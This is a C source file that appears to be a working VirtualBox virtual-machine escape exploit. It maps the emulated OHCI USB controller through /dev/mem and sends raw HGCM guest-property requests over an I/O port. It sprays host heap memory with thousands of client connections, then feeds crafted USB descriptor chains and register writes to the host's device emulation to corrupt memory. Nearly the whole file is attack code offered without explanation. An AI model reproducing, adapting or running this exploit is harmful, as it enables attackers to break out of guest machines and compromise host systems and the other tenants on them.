#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <immintrin.h>
#include <string.h>
#include <assert.h>
#include <sys/io.h>
#include "vmm.h"
#include "Header.h"

#define DEBUG
#define off(locality, uReg) (locality * 0x1000 + uReg)
#define VMMDEV_REQUESTOR_USR_DRV 0x00000001
#define VMMDEV_REQUESTOR_USR_ROOT 0x00000003
#define VMMDEV_REQUESTOR_USR_USER 0x00000006

const size_t OHCI_MMIO_ADDR = 0xf0804000;
const size_t OHCI_MMIO_SIZE = 0x1000;

void *reqBuf;                                                                                                                                                                         
uint32_t *cliIDs;                                                                                                                                                                     
uint32_t idx;                                                                                                                                                                         
uint8_t *ohci;
OHCIED *control_list_Ed = NULL;
OHCIED *control_list_Ed1 = NULL;
OHCIED *control_list_Ed2 = NULL;
OHCITD *control_list_td = NULL;
OHCITD *control_list_td1 = NULL;
OHCITD *control_list_td2 = NULL;
OHCIED *valid_hcca = NULL;
uint32_t old_HcHCCA = 0;
uint32_t old_HcControl = 0;

void die(const char* msg)
{
        perror(msg);
        exit(-1);
}

void *map_mmio(const size_t MMIO_ADDR, const size_t MMIO_SIZE)
{
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd == -1) die("map_mmio - open");
    void *addr = mmap(NULL, MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, MMIO_ADDR);
    if (mlock(reqBuf, MMIO_SIZE)) die("map_mmio - mlock");
    if (addr == NULL) die("map_mmio - mmap");
    printf("mmio @ %p\n", addr);
    return addr;
}

uint32_t ohci_get_register(uint32_t index)
{
    return ((uint32_t*)ohci)[index];
}

void ohci_set_register(uint32_t index, uint32_t value)
{
    ((uint32_t*)ohci)[index] = value;
}

void init()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    reqBuf = mmap(NULL , PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (reqBuf == (void*)(-1)) die("init - mmap");
    printf("HGCM Buffer @ %p\n", reqBuf);
    if (mlock(reqBuf, PAGE_SIZE)) die("init - mlock");
    memset(reqBuf, 0, PAGE_SIZE);
    ohci = (uint8_t*)map_mmio(OHCI_MMIO_ADDR, OHCI_MMIO_SIZE);
    cliIDs = (uint32_t*)malloc(4096 * sizeof(uint32_t));
    iopl(3);
}

uint64_t v2p(void* p)
{
        uint64_t virt = (uint64_t)p;
// Assert page alignment
        assert((virt & (PAGE_SIZE - 1)) == 0);
        int fd = open("/proc/self/pagemap", O_RDONLY);
        if (fd == -1) die("open");
        uint64_t offset = (virt / PAGE_SIZE) * 8;
        lseek(fd, offset, SEEK_SET);
        uint64_t phys;
        if (read(fd, &phys, 8 ) != 8) die("read");
        close(fd);
// Assert page present
        assert(phys & (1ULL << 63));
        phys = (phys & ((1ULL << 54) - 1)) * PAGE_SIZE;
        return phys;
}

void *alloc_dword_phys_addr(uint32_t size)
{
	do
	{
		void *tmp = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED | MAP_32BIT, -1, 0);
		*(char*)tmp = 1;
		uint64_t phys_addr = v2p(tmp);
		if (phys_addr >> 32
                ||  phys_addr > OHCI_HCCA_MASK
                ||  phys_addr < ~OHCI_HCCA_MASK)
		{
			munmap(tmp, size);
		}
		else
		{
			printf("ALLOCATED: %p @ %p, size: 0x%x\n", tmp, phys_addr, size);
			return tmp;
		}
	} while (true);
}

uint32_t HGCMConnect(const char *service, uint32_t fRequestor)
{
    //VMMDevHGCMConnect* hHGCMConnect = (VMMDevHGCMConnect*)mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    VMMDevHGCMConnect* hHGCMConnect = (VMMDevHGCMConnect*)reqBuf;
    memset(hHGCMConnect, 0, PAGE_SIZE);
    hHGCMConnect->header.header.size = sizeof(*hHGCMConnect);
    hHGCMConnect->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
    hHGCMConnect->header.header.requestType = VMMDevReq_HGCMConnect;
    hHGCMConnect->header.header.fRequestor = fRequestor;
    hHGCMConnect->loc.type = VMMDevHGCMLoc_LocalHost_Existing;
    strcpy(hHGCMConnect->loc.u.host.achName,service);
    outl_p(v2p(hHGCMConnect), 0xd040);
    //while (!hHGCMConnect->u32ClientID){usleep(1000);}
    if (!hHGCMConnect->u32ClientID){usleep(1000);}
    //printf("HGCM Client Connection ID: %u\n", hHGCMConnect->u32ClientID);
    return hHGCMConnect->u32ClientID;
}

uint32_t HGCMDisconnect(uint32_t clientID)
{
    VMMDevHGCMDisconnect* hHGCMDisconnect = (VMMDevHGCMDisconnect*)reqBuf;
    memset(hHGCMDisconnect, 0, PAGE_SIZE);
    hHGCMDisconnect->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
    hHGCMDisconnect->header.header.size = sizeof(*hHGCMDisconnect);
    hHGCMDisconnect->header.header.requestType = VMMDevReq_HGCMDisconnect; 
    hHGCMDisconnect->u32ClientID = clientID;
    outl_p(v2p(hHGCMDisconnect), 0xd040);
}

uint32_t switchVGA(uint8_t n, uint8_t byteOffset)
{
    outw_p(0x6, 0x3ce); // pThis->gr_index = 6
    outw_p(0x6, 0x3cf); // pThis->gr[pThis->gr_index] = 6
    outw_p(0x4, 0x3ce); // pThis->gr_index = 4
    outw_p(byteOffset, 0x3cf); // pThis->gr[pThis->gr_index] = byteOffset
    outw_p(0x4, 0x3c4); // pThis->sr_index = 4
    outw_p(0x4, 0x3c5); // pThis->sr[pThis->sr_index] = 4
    outw_p(0x5, 0x1ce); // set VBE register index
    outw_p(n, 0x1cf); // set VBE bank_offset to n << 16
}

VMMDevHGCMRequestHeader *HGCMCall(uint32_t clientID, uint32_t func, uint32_t cParms, HGCMFunctionParameter32* params)
{
    //VMMDevHGCMCall32 *hHGCMCall = (VMMDevHGCMCall32*)mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    VMMDevHGCMCall32 *hHGCMCall = (VMMDevHGCMCall32*)reqBuf;
    memset(hHGCMCall, 0, PAGE_SIZE);
    hHGCMCall->header.header.size = sizeof(*hHGCMCall) + cParms * sizeof(params[0]);
    /*req->header.header.size = 0x408;*/
    hHGCMCall->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
    hHGCMCall->header.header.requestType = VMMDevReq_HGCMCall32;
    hHGCMCall->u32ClientID = clientID;
    hHGCMCall->u32Function = func;
    hHGCMCall->cParms = cParms;
    memcpy((void*)hHGCMCall->params, params, sizeof(params[0]) * cParms);
    outl_p(v2p(hHGCMCall), 0xd040);
    return (VMMDevHGCMRequestHeader*)reqBuf;
}


int wait_prop(uint32_t clientID, char* pattern, int pattern_size, char* out, int outsize) {
        //assert((uint64_t)pattern < 1ll << 32);
        //assert((uint64_t)out < 1ll << 32);

    HGCMFunctionParameter32 params[4];
    params[0].type = VMMDevHGCMParmType_LinAddr_In;
    params[0].u.Pointer.u.linearAddr = (RTGCPTR32)pattern;
    params[0].u.Pointer.size = pattern_size;
    params[1].type = VMMDevHGCMParmType_64bit;
    params[1].u.value64 = 0;
    params[2].type = VMMDevHGCMParmType_LinAddr_Out;
    params[2].u.Pointer.u.linearAddr = (RTGCPTR32)out;
    params[2].u.Pointer.size = outsize;
    params[3].type = VMMDevHGCMParmType_32bit;
    VMMDevHGCMRequestHeader *req = HGCMCall(clientID, GET_NOTIFICATION, 4, params);
    return req->header.rc;
        //printf("wait_prop - rc: %x\n", req->header.rc);
        //printf("wait_prop - result: %x\n", req->result);
}

void spray()
{
        char check;
        char *tmp = malloc(0x70);
        char *tmp2 = malloc(0x20);
        idx = 0;
        for (uint32_t round = 0; round < 3000; ++round)
        {
                uint32_t cID = HGCMConnect("VBoxGuestPropSvc", VMMDEV_REQUESTOR_USR_DRV);
                //printf("%d", round);
                if (cID == 0) 
                {
                        //printf(" failed!\n");
                        continue;
                }
                cliIDs[idx++] = cID;
                //printf(" success!\n");
                for (uint32_t i = 0; i < 16; ++i)
                {
                        memset(tmp, 0, 0x70);
                        sprintf(tmp, "%08d/%08d-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", round+1, i+1);
                        //printf("Spraying %s -> ", tmp);
                        //printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
                }
        }
        for (uint32_t round = 0; round < 2000; ++round)
        {
                uint32_t cID = HGCMConnect("VBoxGuestPropSvc", VMMDEV_REQUESTOR_USR_ROOT);
                //printf("%d", round);
                if (cID == 0) 
                {
                        //printf(" failed!\n");
                        continue;
                }
                cliIDs[idx++] = cID;
                //printf(" success!\n");
                for (uint32_t i = 0; i < 16; ++i)
                {
                        memset(tmp, 0, 0x70);
                        sprintf(tmp, "%08d/%08d-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", round+1, i+1);
                        //printf("Spraying %s -> ", tmp);
                        //printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
                }
        }
        for (uint32_t round = 0; round < 1024; ++round)
        {
                uint32_t cID = HGCMConnect("VBoxGuestPropSvc", VMMDEV_REQUESTOR_USR_USER);
                //printf("%d", round);
                if (cID == 0) 
                {
                        //printf(" failed!\n");
                        continue;
                }
                cliIDs[idx++] = cID;
                //printf(" success!\n");
                for (uint32_t i = 0; i < 16; ++i)
                {
                        memset(tmp, 0, 0x70);
                        sprintf(tmp, "%08d/%08d-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", round+1, i+1);
                        //printf("Spraying %s -> ", tmp);
                        //printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
                }
        }
        //printf("Disconnecting clients...\n");
        //while (idx > -1) HGCMDisconnect(cliIDs[--idx]);
        //memset(cliIDs, 0, sizeof(uint32_t) * 4096);
        //sleep(3);
}

void reset_device()
{
	ohci_set_register(HcHCCA, 0);
    ohci_set_register(21, OHCI_PORT_PRS | OHCI_PORT_CLRSS);
    sleep(1);
}

void init_ohci()
{
	uint8_t* empty_buffer1   = alloc_dword_phys_addr(0x1000);
	uint8_t* empty_buffer2   = alloc_dword_phys_addr(0x1000);
    uint8_t* empty_buffer3   = alloc_dword_phys_addr(0x1000);
    OHCIED* failed_ed       = alloc_dword_phys_addr(sizeof(OHCIED));
    OHCITD* failed_td       = alloc_dword_phys_addr(sizeof(OHCITD));
    control_list_Ed         = alloc_dword_phys_addr(sizeof(OHCIED));
    control_list_Ed1        = alloc_dword_phys_addr(sizeof(OHCIED));
	control_list_Ed2        = alloc_dword_phys_addr(sizeof(OHCIED));
    control_list_td         = alloc_dword_phys_addr(sizeof(OHCITD));
    control_list_td1         = alloc_dword_phys_addr(sizeof(OHCITD));
	control_list_td2		= alloc_dword_phys_addr(sizeof(OHCITD));
    valid_hcca              = alloc_dword_phys_addr(sizeof(OHCIED));
    if (!(    v2p(valid_hcca) >= OHCI_HCCA_MASK
                        ||  v2p(valid_hcca) < ~OHCI_HCCA_MASK))

    failed_ed->HeadP    = v2p(failed_td);
    failed_ed->hwinfo   = ED_HWINFO_DIR + 1;
    failed_ed->NextED   = NULL;
    failed_ed->TailP    = NULL;
    failed_td->hwinfo   = TD_HWINFO_DIR + 1;

    control_list_Ed1->HeadP  = v2p(control_list_td1) & (~ED_HEAD_HALTED);
    control_list_Ed1->hwinfo = 0;
    control_list_Ed1->NextED = v2p(control_list_Ed2);
    control_list_Ed1->TailP  = NULL;

    control_list_Ed->HeadP  = v2p(control_list_td) & (~ED_HEAD_HALTED);
    control_list_Ed->hwinfo = ED_HWINFO_IN;
    control_list_Ed->NextED = v2p(control_list_Ed1);
    control_list_Ed->TailP  = NULL;

	control_list_Ed2->HeadP = v2p(control_list_td2) & (~ED_HEAD_HALTED);
	control_list_Ed2->hwinfo = ED_HWINFO_IN;
    control_list_Ed2->NextED = v2p(failed_ed);
    control_list_Ed2->TailP  = NULL;

	control_list_td2->hwinfo = TD_HWINFO_IN;
	control_list_td2->NextTD = NULL;
	control_list_td2->be	 = v2p(empty_buffer2) + 0x100;
	control_list_td2->cbp	 = v2p(empty_buffer2) + 0;

    control_list_td1->hwinfo = 0;
    control_list_td1->NextTD = NULL;
    control_list_td1->be     = v2p(empty_buffer3) + 0x10;
    control_list_td1->cbp    = v2p(empty_buffer3) + 0;

    control_list_td->hwinfo = TD_HWINFO_IN;
    control_list_td->NextTD = NULL;
    control_list_td->be     = v2p(empty_buffer1) + 0x30;
    control_list_td->cbp    = v2p(empty_buffer1) + 0;

    // Backup
    old_HcHCCA      = ohci_get_register(HcHCCA);
    printf("old HcHCCA: %p\n", old_HcHCCA);
    old_HcControl   = ohci_get_register(HcControl);
}

void software_reset()
{
    ohci_set_register(HcCommandStatus, OHCI_STATUS_HCR);
    ohci_set_register(HcControl, old_HcControl);
}

int main()
{
    init();
	init_ohci();
    printf("write 1\n");
    reset_device();
    software_reset();
	ohci_set_register(HcControlHeadED, v2p(control_list_Ed));
    sleep(1);
    ohci_set_register(21, OHCI_PORT_PRS | OHCI_PORT_CLRSS);
    ohci_set_register(HcControlCurrentED, 0x1000);
    printf("Sleeping...!\n");
    sleep(1);
    ohci_set_register(HcControl, OHCI_CTL_CLE | OHCI_USB_OPERATIONAL);
	printf("about to c00m...");
	ohci_set_register(HcCommandStatus, OHCI_STATUS_CLF);
    printf("write 2\n");
    ohci_set_register(HcHCCA, v2p(valid_hcca));
	sleep(1);
	//ohci_set_register(HcHCCA, 0);
}